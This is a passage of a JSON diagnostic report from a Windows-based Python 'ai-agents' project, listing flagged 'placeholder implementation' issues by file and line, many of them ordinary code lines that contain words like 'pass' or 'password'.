        "timestamp": "2025-09-05T17:30:38.810944"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 473: Placeholder implementation - results[\"placeholder_analysis\"] = self.diagnose_placeholders()",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.811092"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 475: Placeholder implementation - logger.error(f\"Placeholder analysis failed: {e}\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.811099"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 476: Placeholder implementation - results[\"placeholder_analysis\"] = {\"error\": str(e)}",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.811104"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 540: Placeholder implementation - # Placeholder issues",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.811200"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 541: Placeholder implementation - if \"placeholder_analysis\" in results:",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.811205"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 542: Placeholder implementation - placeholder_count = results[\"placeholder_analysis\"].get(\"placeholders_found\", 0)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.811210"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 543: Placeholder implementation - if placeholder_count > 0:",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.811215"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 547: Placeholder implementation - \"issue\": f\"Found {placeholder_count} placeholder implementations\",",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.811225"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 548: Placeholder implementation - \"fix\": \"Replace placeholder functions with actual implementations\",",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.811230"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "issue": "Line 549: Placeholder implementation - \"details\": results[\"placeholder_analysis\"].get(\"placeholder_details\", [])",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.811235"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "issue": "Line 38: Placeholder implementation - self.passed_count = 0",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.812994"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "issue": "Line 61: Placeholder implementation - status_symbol = \"[PASS]\" if status == \"PASS\" else \"[FAIL]\" if status == \"FAIL\" else \"[WARN]\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.813035"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "issue": "Line 64: Placeholder implementation - if status == \"PASS\":",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.813043"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "issue": "Line 322: Placeholder implementation - \"password\": self.redis.redis_password,",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.821323"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "issue": "Line 301: Placeholder implementation - - Username/password",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.822280"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
        "issue": "Line 188: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.860452"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
        "issue": "Line 542: Placeholder implementation - raise NotImplementedError",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.861216"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
        "issue": "Line 546: Placeholder implementation - raise NotImplementedError",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.861231"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\frameworks\\phase7_experimental_framework.py",
        "issue": "Line 550: Placeholder implementation - raise NotImplementedError",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.861241"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "issue": "Line 869: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.866793"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\meta_demo\\demo_engine.py",
        "issue": "Line 911: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.866868"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "issue": "Line 141: Placeholder implementation - return {\"passed\": False, \"error\": \"System not set up\"}",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.877935"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "issue": "Line 194: Placeholder implementation - return {\"passed\": False, \"error\": \"System not set up\"}",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.878025"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "issue": "Line 248: Placeholder implementation - return {\"passed\": False, \"error\": \"System not set up\"}",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.878108"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "issue": "Line 301: Placeholder implementation - return {\"passed\": False, \"error\": \"System not set up\"}",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.878192"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "issue": "Line 353: Placeholder implementation - return {\"passed\": False, \"error\": \"System not set up\"}",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.878282"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "issue": "Line 395: Placeholder implementation - return {\"passed\": False, \"error\": \"System not set up\"}",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.878350"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\scripts\\run_integration_tests.py",
        "issue": "Line 509: Placeholder implementation - return {\"passed\": False, \"error\": \"System not set up\"}",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.878530"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
        "issue": "Line 352: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.884065"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
        "issue": "Line 405: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.884157"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\templates\\base_agent.py",
        "issue": "Line 410: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.884169"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "issue": "Line 343: Placeholder implementation - summary = {\"passed\": 0, \"failed\": 0, \"skipped\": 0, \"errors\": 0}",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.888496"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "issue": "Line 346: Placeholder implementation - if \"passed\" in line and \"failed\" in line:",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.888507"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\run_comprehensive_tests.py",
        "issue": "Line 371: Placeholder implementation - total_passed = 0",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.888559"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\test_automation_runner.py",
        "issue": "Line 404: Placeholder implementation - overall_pass = True",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.889782"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
        "issue": "Line 58: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.892998"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tools\\tool_framework.py",
        "issue": "Line 63: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.893017"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "issue": "Line 352: Placeholder implementation - # This is a placeholder - replace with actual embedding model",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.896150"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "issue": "Line 665: Placeholder implementation - # Placeholder methods for FAISS and ChromaDB operations not implemented yet",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.896623"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "issue": "Line 718: Placeholder implementation - # Placeholder methods for ChromaDB recent/frequent queries",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.896707"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "issue": "Line 760: Placeholder implementation - 'memory_types': [],  # Placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.896773"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "issue": "Line 761: Placeholder implementation - 'avg_importance': 0.5,  # Placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.896778"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "issue": "Line 762: Placeholder implementation - 'common_tags': []  # Placeholder",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.896783"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "issue": "Line 766: Placeholder implementation - \"\"\"Consolidate similar memories (placeholder implementation)\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.896793"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\utils\\memory\\vector_memory.py",
        "issue": "Line 773: Placeholder implementation - \"\"\"Get memories by tag (placeholder implementation)\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.896806"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "issue": "Line 649: Placeholder implementation - # This is a placeholder - real implementation would need multi-agent test data",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.900205"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\advanced\\behavior_validator.py",
        "issue": "Line 789: Placeholder implementation - failed_tests = [t for t in test_results if not t.passed]",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.900432"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "issue": "Line 154: Placeholder implementation - \"password\": \"testpass\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.902725"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\api\\test_enterprise_api.py",
        "issue": "Line 738: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.903644"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "issue": "Line 41: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.908040"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "issue": "Line 1468: Placeholder implementation - passed_tests = sum(1 for result in test_results if result.success)",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.910278"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_component_interactions.py",
        "issue": "Line 1469: Placeholder implementation - failed_tests = total_tests - passed_tests",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.910290"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
        "issue": "Line 41: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.911241"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\integration\\test_phase6_integration.py",
        "issue": "Line 45: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.911257"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "issue": "Line 317: Placeholder implementation - total = passed = failed = skipped = 0",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.917651"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\phase7\\run_phase7_tests.py",
        "issue": "Line 519: Placeholder implementation - f.write(f\"**Overall Success:** {'✅ PASSED' if report.overall_success else '❌ FAILED'}\\n\\n\")",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.917990"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "issue": "Line 274: Placeholder implementation - memory_usage=0.0,  # TODO: Add memory tracking",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.939026"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "issue": "Line 627: Placeholder implementation - coherence_score = 0.8  # Placeholder - would need sophisticated coherence analysis",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.939572"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\reasoning\\test_reasoning_validation.py",
        "issue": "Line 715: Placeholder implementation - if perf[\"pass_rate\"] < 0.8:",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.939712"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Line 41: Placeholder implementation - 'passed': self.passed,",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.940789"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\scripts\\comprehensive_agent_tests.py",
        "issue": "Line 1190: Placeholder implementation - passed_tests = [r for r in self.results if r.passed]",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.943128"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "issue": "Line 217: Placeholder implementation - \"\"\"Test authentication bypass attempts\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.945362"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "issue": "Line 220: Placeholder implementation - # Common authentication bypass attempts",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.945374"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "issue": "Line 221: Placeholder implementation - bypass_attempts = [",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.945380"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "issue": "Line 263: Placeholder implementation - 'admin': 'secure_password_hash_12345',",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.945458"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "issue": "Line 264: Placeholder implementation - 'user1': 'user_password_hash_67890',",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.945463"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "issue": "Line 542: Placeholder implementation - async def test_authentication_bypass_attempts(self, security_framework):",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.945894"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "issue": "Line 543: Placeholder implementation - \"\"\"Test authentication bypass protection\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.945899"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\tests\\security\\test_security_measures.py",
        "issue": "Line 544: Placeholder implementation - bypass_attempts = [",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.945904"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "issue": "Line 139: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.961871"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "issue": "Line 144: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.961890"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "issue": "Line 149: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.961901"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\base_algorithm.py",
        "issue": "Line 154: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.961911"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
        "issue": "Line 128: Placeholder implementation - \"\"\"Forward pass returning mean and log_std\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.962962"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
        "issue": "Line 417: Placeholder implementation - Forward pass of mixing network",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.963376"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\algorithms\\networks.py",
        "issue": "Line 496: Placeholder implementation - \"\"\"Forward pass with noisy linear transformation\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.963496"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "issue": "Line 179: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.965454"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "issue": "Line 184: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.965468"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "issue": "Line 265: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.965588"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "issue": "Line 270: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.965601"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "issue": "Line 275: Placeholder implementation - pass",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.965627"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "issue": "Line 443: Placeholder implementation - \"\"\"Create RGB array representation (placeholder)\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.965885"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\rl\\environments\\base_environment.py",
        "issue": "Line 444: Placeholder implementation - # Return simple placeholder image",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.965891"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
        "issue": "Line 419: Placeholder implementation - # Create placeholder for real-time updates",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.984028"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
        "issue": "Line 420: Placeholder implementation - placeholder = st.empty()",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.984040"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\components\\performance_monitor.py",
        "issue": "Line 480: Placeholder implementation - with placeholder.container():",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.984126"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "issue": "Line 25: Placeholder implementation - # from .websocket_handler import WebSocketHandler  # Not implemented yet",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.987077"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "issue": "Line 26: Placeholder implementation - # from .metrics_collector import MetricsCollector  # Not implemented yet",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.987086"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "issue": "Line 27: Placeholder implementation - # from .visualization_engine import VisualizationEngine  # Not implemented yet",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.987091"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "issue": "Line 28: Placeholder implementation - # from .interaction_tracker import InteractionTracker  # Not implemented yet",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.987097"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "issue": "Line 51: Placeholder implementation - # self.websocket_handler = WebSocketHandler()  # Not implemented yet",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.987132"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "issue": "Line 52: Placeholder implementation - # self.metrics_collector = MetricsCollector()  # Not implemented yet",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.987137"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "issue": "Line 53: Placeholder implementation - # self.visualization_engine = VisualizationEngine()  # Not implemented yet",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.987142"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\coordination\\dashboard_server.py",
        "issue": "Line 54: Placeholder implementation - # self.interaction_tracker = InteractionTracker()  # Not implemented yet",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.987146"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
        "issue": "Line 69: Placeholder implementation - \"\"\"Hash password using SHA-256\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.990350"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
        "issue": "Line 70: Placeholder implementation - return hashlib.sha256(password.encode()).hexdigest()",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.990368"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
        "issue": "Line 97: Placeholder implementation - \"\"\"Authenticate user with email and password\"\"\"",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.990481"
      },
      {
        "category": "PLACEHOLDER",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\utils\\auth.py",
        "issue": "Line 101: Placeholder implementation - stored_password = self.users[email]['password']",
        "severity": "ERROR",
        "timestamp": "2025-09-05T17:30:38.990499"
      },
      {
        "category": "PLACEHOLDER",
